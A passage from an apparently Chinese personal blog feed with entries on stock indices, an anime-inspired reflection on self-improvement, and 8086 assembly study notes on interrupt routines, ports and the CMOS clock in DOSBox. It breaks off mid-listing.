title="沪深300、中证500、上证50"></a>沪深300、中证500、上证50</h3><p>沪深300指数，可以理解为，股市中权重最大、成交最为活跃的300只股票，按照一定的计算方法计算出来的。这个指数的走势，代表的是市场中权重股的走势，比如工商银行、贵州茅台、中国石油这些股票。</p><p>现在很多业绩基准都是以沪深300作为基准进行比较。比如一个基金是否跑赢了市场，会把基金收益率和沪深300的收益率比较，而不是上面所说的上证指数（大盘）。</p><p>这是因为现在普遍认为，上证指数已经失真了，不能准确反应整个市场的走势。因为上证指数更多的是代表权重大盘股的走势，而不是整个市场。</p><p>中证500指数，可以看作是，排在上面所说的300只股票之后的500只，也就是排名301-800的那些股票，按照一定的方法计算出来的。这个指数的走势，代表的是市场里面中小股票的走势，排名301-800的500只股票，一般是细分行业的龙头股。比如通策医疗、宝信软件、绝味食品等。</p><p>上证50指数，是由上海证券交易所上市的（股票代码60开头的），权重最大，成交最活跃的50只股票，计算出来的一个指数。这个指数的走势，代表的是权重中的权重股的走势。</p>]]></content>
      
      
      <categories>
          
          <category> 财经 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基金 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动漫-斗破苍穹</title>
      <link href="/2021/10/31/dong-man-dou-po-cang-qiong/"/>
      <url>/2021/10/31/dong-man-dou-po-cang-qiong/</url>
      
        <content type="html"><![CDATA[<h1 id="三年之约"><a href="#三年之约" class="headerlink" title="三年之约"></a>三年之约</h1><p>三年之约真的拍了三年，虽然没有看过小说，但随着慢慢地在看动漫以后，内心里也真正喜欢上了萧炎。可能动漫中确实有些夸张的地方，但还是能从中得到些许关于生活的感悟。</p><p>在第四季的结尾，萧炎临上云岚宗的那份淡然与宁静。他想到的是这三年间，帮助过他的人，自己经历过的事情。配上动漫的场景，的确看的出来制作方的确很用心。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211031212833.png" alt="临上云岚宗"></p><p>在忍受退婚之后，他一直以打败纳兰嫣然为目标，不断地去磨砺自己，增强自己的本领。但直到药老因为耗尽灵魂力量而进入沉睡状态的时候，萧炎才真正地明白：原来他是那么依赖药老。从那之后，他开始独自面对复杂的情况，准备唤醒药老的丹药。</p><p>萧炎也曾说，三年之约不过是给过去三年的一个交代。他真的是放下了，真正地专注于自己，而不是要打败谁。在经历了如此多的事情之后，他的内心真的已经很强大了。有的时候，我真觉得生活也是这样。我以前在高中的学习生活中，经常要以谁谁为目标，要在考试中超过他。但却总是事与愿违。经常因此灰心丧气许久。或者就是因为在打球的过程中，经常会有人嘲笑我，我就要非常努力地练球，证明给他们看。</p><p>可以说，前期的这些的确给了我很大的学习动力，但我因此浪费了很多不必要的精力和时间。因为我可能并没有想清楚自己想要活成什么样子。真正改变我的，就是复读的那一年。从现在的角度上来看，复读真的锻炼了我心理。几乎永远都在教室的最后面，老师不记得我的名字，同学只认识舍友，几乎没有任何娱乐活动。在那段日子里，我真的感觉自己每天都在进步，也或许正是从那个时候开始，我才明白我是要做我自己，不需要去看别人。正是这些经历，我在上大学之后，就一直锻炼自己的一个人生活的能力。</p><p>我再也不需要什么目标了，真正要做的就是不断地去完善自己。我不会左手，我就在寒假中努力的练习左手运球。我不会投三分，我就练深蹲和平板支撑锻炼自己的核心。并不是为了超越谁谁谁，也不是为了去赢得别人在球场上对我的赞美。就单纯地只是在完善自己。在家里没有球馆，没有场地，就自己去找没人的地方练习。令我很庆幸的是，路过的路人并没有嘲笑我。他们反而再说我是专业打球的。这真的令我很惭愧，也很高兴。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211031215440.jpg" alt="在家时训练的场地"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/QQ%E5%9B%BE%E7%89%8720211031215449.jpg" alt="夕阳"></p><p>在学习上也是这样，虽然的确跟很多优秀的同学实在是没法比较，但我也习惯了这种巨大的差距。并不是躺平，我只是不想因为别人，而改变了我自己前进的方向。</p><p>就像片尾曲所唱的那样(<code>角色</code>)</p><blockquote><p>只需要 记得<br>从前现在 都要坚持 自我</p></blockquote><p>这文笔实在是差，写着写着就不知道写啥了。~~~~😀</p><p>以后我也想把这里当成个日记。想写的就随便写，反正也没人认识我。也没什么人可以看到。</p>]]></content>
      
      
      <categories>
          
          <category> 动漫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 斗破苍穹 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-直接定位表</title>
      <link href="/2021/10/26/hui-bian-yu-yan-xue-xi-zhi-jie-ding-wei-biao/"/>
      <url>/2021/10/26/hui-bian-yu-yan-xue-xi-zhi-jie-ding-wei-biao/</url>
      
        <content type="html"><![CDATA[<h1 id="直接定址表"><a href="#直接定址表" class="headerlink" title="直接定址表"></a>直接定址表</h1><h2 id="描述了单元长度的标号"><a href="#描述了单元长度的标号" class="headerlink" title="描述了单元长度的标号"></a>描述了单元长度的标号</h2><p>以前我们多采用后面不带冒号的形式进行编程</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume:codecode segment    a: db 1,2,3,4,5,6,7,8    b: dw 0start:    mov si,offset a    mov bx,offset b    mov cx,8s:    mov al,cs:[si]    mov ah,0    add cs:[bx],ax    inc si    loop s    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>But the mark only represent the address of the memory. We still have another form of the mark that does not have the colon. For example.</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume:codecode segment    a db 1,2,3,4,5,6,7,8    b dw 0start:    mov si,offset a    mov bx,offset b    mov cx,8s:    mov al,a:[si]    mov ah,0    add bs,ax    inc si    loop s    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>mov al,a[si]</code> equal to <code>mov al,cs:0[si]</code></p><p>So, we could find  the way helps us access the address of memory in a neat form. We call it data-mark.他标记了存储数据的单元的地址和长度，它不同于仅仅表示地址的标号。</p><h2 id="在其他段使用数据标号"><a href="#在其他段使用数据标号" class="headerlink" title="在其他段使用数据标号"></a>在其他段使用数据标号</h2><p>一般来说，我们不在代码段中定义数据，而是将数据定义到其他段中，在其他段中，我们也可以使用数据标号来描述数据单元的地址和长度。</p><p><strong>注意：在后面加有‘：’的地址只能在代码段中使用，不能在其他段使用。</strong></p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>安装一个新的int 7ch中断例程</p><blockquote><p>功能: 1.clear the screen<br>2.set the foreground<br>3.set the background<br>4.move up one row</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>编写新的int 7ch 中断例程</li><li>安装新的int 7ch 中断例程</li></ul><blockquote><p>这个实验过程的代码出了很多问题，到最后终于改好了。</p></blockquote><h4 id="初期的改错思路"><a href="#初期的改错思路" class="headerlink" title="初期的改错思路"></a>初期的改错思路</h4><p>the major problem 是中断例程中<code>table dw sub1,sub2,sub3,sub4</code>无法正常运作。<br>给人的感觉好像，不能在程序中用一样.按照这种形式写的话，后面的set标号无法被正确的编译。不知道为什么都变成了table标号下面的??</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211025211433.png" alt="问题1"></p><p>改成这种形式之后，才能在debug中的cpu看到正确的汇编代码，虽然代码段中把它们这些地址解析成了汇编指令</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211025210841.png" alt="问题2"></p><p>通过后续的观察发现,其实代码是被正确解析了的，只是在cpu版块的显示上table段中的存放的数据被当作了指令。但是为什么程序不执行呢？</p><blockquote><p>这也是为什么要把jmp命令放在前面的原因，就是为了不让table段存放的数据被当作指令执行，这样的话，肯定有问题的</p></blockquote><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211025212251.png" alt="改变写法后的对比图"></p><h4 id="后期的改错思路"><a href="#后期的改错思路" class="headerlink" title="后期的改错思路"></a>后期的改错思路</h4><p>先整理一下初期思路中出错的原因，再分析一下是哪些基础的知识没有掌握好，导致我们这么长时间一直在纠错</p><p><strong>初期思路：</strong></p><ul><li><p>1.jmp命令放在前面的原因，就是为了防止我们存储的数据被当作指令执行，这也是为什么你在debug模块中的cpu看汇编代码的时候，看起来好像很奇怪。但是它们都是正常的指令。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026164553.png" alt="cpu视角下的汇编代码"></p></li><li><p>2.<code>tabledata dw sub1,sub2,sub3,sub4;</code>无论是tabledata 还是 sub1，sub2 这些地址都是相对于最开始运行的CS段而言的，而我们想要的是中断例程，也就是执行中断例程的时候的CS段。这样去调用的话，肯定会出错。说成白话的话就是，本来一棵树距离图书馆35米，但是现在要问你，这棵树举例教学楼多少米，你要是还说35米。那是不是有点刻舟求剑的意思了。<strong>所以，真正要采用的是相对地址，还得加上0200h才行！</strong>    这样才行<code>tabledata dw offset sub1 - offset interupt + 0200h,offset sub2 - offset interupt+0200h,offset sub3 - offset interupt+0200h,offset sub4 - offset interupt+0200h</code></p></li><li><ol start="3"><li><code>call word ptr [bx]</code>这样默认的访问地址是 <code>ds+bx</code>，而你想要的是<code>cs:[bx]</code>所以要把寄存器显式的标注出来啊</li></ol></li><li><ol start="4"><li>虽然中断例程处，确实没有办法通过<code>F7</code>进入，但是可以通过看<code>0000:0200h</code>内存中代码，就可以发现到底是不是你想要的了。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026165549.png" alt="0000:0200处的代码"></li></ol></li><li><ol start="5"><li>int指令和iret指令的作用，如果真的能很好的掌握这两个指令，也犯不着这么长时间才找到问题的源头。</li></ol></li></ul><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codecode segmentstart:    mov ax,cs    mov ds,ax    mov si,offset interupt; set the ds:si point to the source address    mov ax,0    mov es,ax    mov di,0200h; set the es:di point to the destination address    mov cx,offset interuptend-offset interupt; cx the length of transmisson    cld ; the sequence of the transmit    rep movsb    mov ax,0    mov es,ax    cli    mov word ptr es:[7ch*4],0200h    mov word ptr es:[7ch*4+2],0    sti    ;调用之前的设置你需要再看一下要求是怎么设置的    mov ah,2    mov al,3        int 7ch; 这里怎么跳到了4002h    ; call interupt    mov ax,4c00h    int 21h;所以程序大体上是没有问题的;但是加上table sub1,sub2,sub3,sub4之后就显的怪怪的;通过调试程序来看的话,只有mov bl,ah之后的程序是正常的;前面的程序好像都是错的一样,--通过CPU反汇编的指令来看的话,前面的几句都不对;我如果去掉table直接调用函数的话,就不会出现上述问题;对前面的简单程序进行操作后发现,这个table dw sub1,sub2,sub3,sub4不能在标号里面;也不是因为jmp short set语句和tabledata dw......两个语句的顺序问题;书上说interupt:    jmp short set    ;并不是写法是错的，而是你用错了    ;按道理来说,程序的执行CS IP 本来在code段    ;现在你引发了中断以后就跑到 中断例程中的CS IP了,但是此时 tabledata中保存的仍然是最开始的CS IP 这样一跳转的话,z    ; tabledata dw sub1,sub2,sub3,sub4;这种写法是错误的    ;写成下面这种形式的话，set标号就会重新显示出来    tabledata dw offset sub1 - offset interupt + 0200h,offset sub2 - offset interupt+0200h,offset sub3 - offset interupt+0200h,offset sub4 - offset interupt+0200h    ; tabledata dw offset sub1 - offset interupt + 0200h,offset sub2 - offset interupt + 0200h,offset sub3 - offset interupt + 0200h,offset sub4 - offset interupt + 0200hset:    push bx    push es    push cx    cmp ah,3;判读功能号是否大于3    ja sret    mov bl,ah    mov bh,0    add bx,bx;根据ah中的功能号计算对应子程序在table表中的偏移    add bx,offset tabledata-offset interupt + 0200h    ; call word ptr (offset tabledata-offset interupt)[bx+0200h];调用对应的功能子程序这句话有问题     ; 上面这条指令错就错在 这样隐含的寄存器是ds 也就是 访问的是ds:[...]但是我们想要的是cs:[bx]    call word ptr cs:[bx]    ; add bx,7e02h    ; jmp cs:[bx]sret:    pop cx    pop es    pop bx    ; ret    iret;make the screen emptysub1:    push bx    push cx    push es    mov bx,0b800h    mov es,bx    mov bx,0    mov cx,2000sub1s:    mov byte ptr es:[bx],' '    add bx,2    loop sub1s    pop es    pop cx    pop bx    ret    ; jmp sret; set the foregroundsub2:    push bx    push cx    push es    mov bx,0b800h    mov es,bx    mov bx,1    mov cx,2000sub2s:    and byte ptr es:[bx],11111000B    or es:[bx],al    add bx,2    loop sub2s    pop es    pop cx    pop bx    ret;set the background colorsub3:    push bx    push cx    push es    mov cl,4    shl al,cl    mov bx,0b800h    mov es,bx    mov bx,1    mov cx,2000sub3s:    and byte ptr es:[bx],10001111B    or es:[bx],al    add bx,2    loop sub3s    pop es    pop cx    pop bx    ret;scroll up one linesub4:    push cx    push si    push di    push es    push ds    mov si,0b800h    mov es,si    mov ds,si    mov si,160;ds:si指向第n+1行    mov di,0;es:di指向第n行    cld    mov cx,24;共复制24行sub4s:    push cx    mov cx,160    rep movsb    pop cx    loop sub4s    mov cx,80    mov si,0sub4s1:    mov byte ptr [160*24+si],' ';最后一行清空    add si,2    loop sub4s1    pop ds    pop es    pop di    pop si    pop cx    retinteruptend:    nopcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026170129.png" alt="清屏"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026170158.png" alt="设置前景色"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026170051.png" alt="设置背景色"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211026170240.png" alt="向上滚动一行"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-外中断</title>
      <link href="/2021/10/24/hui-bian-yu-yan-xue-xi-wai-zhong-duan/"/>
      <url>/2021/10/24/hui-bian-yu-yan-xue-xi-wai-zhong-duan/</url>
      
        <content type="html"><![CDATA[<h1 id="外中断"><a href="#外中断" class="headerlink" title="外中断"></a>外中断</h1><h2 id="关于DOS-box是否真的操作硬件和内存的疑惑"><a href="#关于DOS-box是否真的操作硬件和内存的疑惑" class="headerlink" title="关于DOS-box是否真的操作硬件和内存的疑惑"></a>关于DOS-box是否真的操作硬件和内存的疑惑</h2><p>DOSBox is a <code>DOS-emulator</code> that uses the <code>SDL-library</code>which makes DOSBox very easy to port to different platforms. DOSBox has already been ported to many different platforms, such as Windows, BeOS, Linux, MacOS X…</p><p><code>Simple DirectMedia Layer is a cross-platform development library designed to provide low level access to audio, keyboard, mouse, joystick, and graphics hardware via OpenGL and Direct3D.</code>It is used by video playback software, emulators, and popular games including Valve’s award winning catalog and many Humble Bundle games.</p><p>SDL officially supports Windows, Mac OS X, Linux, iOS, and Android. Support for other platforms may be found in the source code.</p><p>SDL is written in C, works natively with C++, and there are bindings available for several other languages, including C# and Python.</p><h2 id="为什么有这个疑惑呢？"><a href="#为什么有这个疑惑呢？" class="headerlink" title="为什么有这个疑惑呢？"></a>为什么有这个疑惑呢？</h2><p>在之前的实验中，我们在中断向量表0000:0200至0000:02FF的部分增添了新的0号中断例程，并且修改了0号表项的入口地址，这样做，是不是影响了后续的程序呢？后面的程序是不是也会同样会收到影响呢？</p><p>好像是没有的,因为后面程序在<code>div指令溢出后</code>总是跑到一个循环里出不来</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211024105838.png" alt="1句"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211024105726.png" alt="2，3句"></p><p><strong>难道每次模拟的时候都会初始化？？也不是没有可能</strong></p><blockquote><p>通过本次实验的效果来看的话，上面的这个猜想是对的，也就是说DOS-box在每次重新打开的时候都会初始化，但是如果你不关闭这个DOS环境的话，它还是会影响下面的</p></blockquote><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>安装一个新的int 9中断例程</p><blockquote><p>功能: 在DOS下，按下‘A’键后，除非不再松开，如果松开就显示全屏的A，其他键照常使用</p></blockquote><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>编写新的int 9 中断例程</li><li>保存原有的int 9 地址</li><li>安装新的int 9 中断例程</li></ul><blockquote><p>感觉整个章节的思路比较有借鉴意义，当我没有不太想重新写一个函数，但是又要改善原有函数的功能的话，可以在新函数中去调用原函数，以屏蔽掉繁琐的步骤，更好的完善自己改善的功能。</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codestack segment    db 128 dup(0)stack endscode segmentstart:    mov ax,stack    mov ss,ax    mov sp,128    push cs    pop ds    mov ax,0    mov es,ax    mov si,offset int9    mov di,204h    mov cx,offset int9end-offset int9    cld    rep movsb    push es:[9*4]    pop es:[200h]    push es:[9*4+2]    pop es:[202h]    cli    mov word ptr es:[9*4],204h    mov word ptr es:[9*4+2],0    sti;     mov ax,0b800h;     mov es,ax;     mov ah,'a'; s:;     mov es:[160*12+40*2],ah;     call delay;     inc ah;     cmp ah,'z';     jna s    mov ax,4c00h    int 21hint9:    push ax    push bx    push cx    push es    in al,60h        pushf    call dword ptr cs:[200h]    cmp al,1eh+80h    je printA    jmp int9retprintA:    ;if loose A    mov ax,0b800h    mov es,ax    mov bx,0    mov cx,2000s2:     mov byte ptr es:[bx],'A'    add bx,2    loop s2int9ret:    pop es    pop cx    pop bx    pop ax    iretint9end:    nopcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>得先运行程序,然后在按下a就会有全屏A的效果了</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211024204149.png" alt="20211024204149"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-端口</title>
      <link href="/2021/10/23/hui-bian-yu-yan-xue-xi-duan-kou/"/>
      <url>/2021/10/23/hui-bian-yu-yan-xue-xi-duan-kou/</url>
      
        <content type="html"><![CDATA[<h1 id="端口"><a href="#端口" class="headerlink" title="端口"></a>端口</h1><p>我们前面讲过,各种存储器都和CPU的地址线\数据线\控制线相连. CPU在操控它们的时候,把它们都当作内存来对待,把它们总地看作一个由若干存储单元组成的逻辑存储器,这个逻辑存储器我们称其位内存地址空间.</p><p>在PC机系统中,和CPU通过总线相连的芯片除各种存储器外,还有以下三种芯片.</p><ul><li>各种接口卡(比如 网卡\显卡) 上的接口芯片,它们控制接口卡进行工作;</li><li>主板上的接口芯片,CPU通过它们对部分外设进行访问;</li><li>其他芯片,用来存储相关的系统信息,或进行相关的输入输出处理</li></ul><p>在这些芯片中,都由一组可以由CPU读写的寄存器.这些寄存器,它们在物理上可能处于不同的芯片中,但是它们在以下两点上相同:</p><ul><li>都和CPU的总线相连,当然这种链接是通过它们所在的芯片进行的</li><li>CPU对它们进行读或者写的时候都通过控制线向它们所在的芯片发出端口读写命令</li></ul><p>可见,从CPU的角度,这些寄存器都当作端口,对它们进行统一编址,从而建立了一个统一的端口地址空间.每一个端口在地址空间中都有一个地址.</p><p>CPU 可以直接独写以下三个地方的数据:</p><ul><li>CPU内部的寄存器</li><li>内存单元</li><li>端口</li></ul><h2 id="端口独写"><a href="#端口独写" class="headerlink" title="端口独写"></a>端口独写</h2><h3 id="访问内存"><a href="#访问内存" class="headerlink" title="访问内存"></a>访问内存</h3><p><code>mov ax,ds:[8]</code></p><ul><li>CPU通过地址线将地址信息8发出</li><li>CPU通过控制线发出内存读命令,选中存储器芯片,并通知它,将要从中读取数据</li><li>存储器将8号单元中的数据通过数据线送入CPU</li></ul><h3 id="访问端口"><a href="#访问端口" class="headerlink" title="访问端口"></a>访问端口</h3><p><code>int al,60h</code></p><ul><li>CPU通过地址线将地址信息60h发出;</li><li>CPU通过控制线发出端口读命令,选中端口所在的芯片,并通知它,将要从中读取数据</li><li>端口所在的芯片将60h端口中的数据通过数据线送入CPU</li></ul><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>CMOS RAM 中,存放着当前的时间: 年\月\日\时\分\秒,这六个信息的长度均为1字节.以BCD码的方式存放</p><blockquote><p>编程 以 <code>年/月/日 时:分:秒</code>的格式,显示当前的日期\时间</p></blockquote><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>因为读写的单元不是很有规律,所以只能一个一个的写了</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codedata segment    db 20 dup(0)data ends;s min hour day month yearcode segmentstart:    ;s    mov bl,0    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax        ;分    mov bl,2    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax        ;时    mov bl,4    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax    ;日    mov bl,7    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax        ;月    mov bl,8    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax    ;年    mov bl,9    mov al,bl    out 70h,al    in al,71h    mov ah,al    mov cl,4    shr ah,cl;右移四位,取高4位    and al,00001111b;与,取低4位        add ah,30h    add al,30h    push ax    mov ax,data    mov ds,ax    pop ax    mov ds:[0],ah    mov ds:[1],al    mov byte ptr ds:[2],'/'    pop ax    mov ds:[3],ah    mov ds:[4],al    mov byte ptr ds:[5],'/'        pop ax    mov ds:[6],ah    mov ds:[7],al        mov byte ptr ds:[8],' '        pop ax    mov ds:[9],ah    mov ds:[10],al    mov byte ptr ds:[11],':'        pop ax    mov ds:[12],ah    mov ds:[13],al    mov byte ptr ds:[14],':'    pop ax    mov ds:[15],ah    mov ds:[16],al    mov bx,0b800h    mov es,bx    mov si,0    mov bx,0    mov cx,0s:     mov byte ptr cl,ds:[bx]    jcxz ok    mov byte ptr es:[160*12+40*2+si],cl    inc bx    add si,2    jmp sok:    mov ax,4c00h    int 21hcode endsend start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211023202035.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>汇编语言学习-int指令</title>
      <link href="/2021/10/23/hui-bian-yu-yan-xue-xi-int-zhi-ling/"/>
      <url>/2021/10/23/hui-bian-yu-yan-xue-xi-int-zhi-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="int指令"><a href="#int指令" class="headerlink" title="int指令"></a>int指令</h1><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211023100523.png" alt="思维导图"></p><h2 id="BIOS和DOS中断例程的安装过程"><a href="#BIOS和DOS中断例程的安装过程" class="headerlink" title="BIOS和DOS中断例程的安装过程"></a>BIOS和DOS中断例程的安装过程</h2><ul><li>开机后，CPU一加电，初始化CS=0FFFFH，IP=0，自动从FFFF：0单元开始执行程序。FFFF：0处有一条跳转指令，CPU执行该指令后，转去执行BIOS中的硬件检测系统和初始化程序</li><li>初始化程序将建立BIOS所支持的中断向量。<blockquote><p>注意， 对于BIOS所提供的中断例程，只需要将入口地址登记在中断向量表中即可，因为他们是固化到ROM中的程序，一直在内存中存在</p></blockquote></li><li>硬件系统检测和初始化完成后，调用int 19h进行操作系统引导。从此将计算机交由操作系统控制。</li><li>DOS启动后，除完成其他工作外，还将它所提供的中断例程装入内存，并建立相应的中断向量。</li></ul><h2 id="实验13"><a href="#实验13" class="headerlink" title="实验13"></a>实验13</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><blockquote><p>编写并安装int 7ch中断例程，功能为显示一个用0结束的字符串，中断例程安装在0：200处<br>dh 行号，dl 列号， cl 颜色， ds:si指向字符串首地址</p></blockquote><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ul><li>编写能显示字符串的中断处理程序</li><li>将终端服务程序移动到0000:0200处</li><li>修改中断向量表中的7cH号中断的入口地址,使其指向0000:0200</li></ul><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><blockquote><p>一些注意事项和问题就写到注释里面了,后面忘了的话记得看看</p></blockquote><pre class="line-numbers language-text" data-language="text"><code class="language-text">assume cs:codedata segment    db 'welcome to masm!',0data endscode segmentstart:    mov ah,15    int 10h    mov ah,0    int 10h    mov ax,cs    mov ds,ax    mov si,offset interupt; set the ds:si point to the source address    mov ax,0    mov es,ax    mov di,200h; set the es:di point to the destination address    mov cx,offset interuptend-offset interupt; cx the length of transmisson    cld ; the sequence of the transmit    rep movsb    mov ax,0    mov es,ax    mov word ptr es:[7ch*4],200h    mov word ptr es:[7ch*4+2],0        mov dh,10    mov dl,10    mov cl,2    mov ax,data    mov ds,ax    mov si,0    int 7ch    mov ax,4c00h    int 21h;dh 行号;dl 列号;cl 颜色;ds:si 指向字符串首地址interupt:    mov ax,0b800h    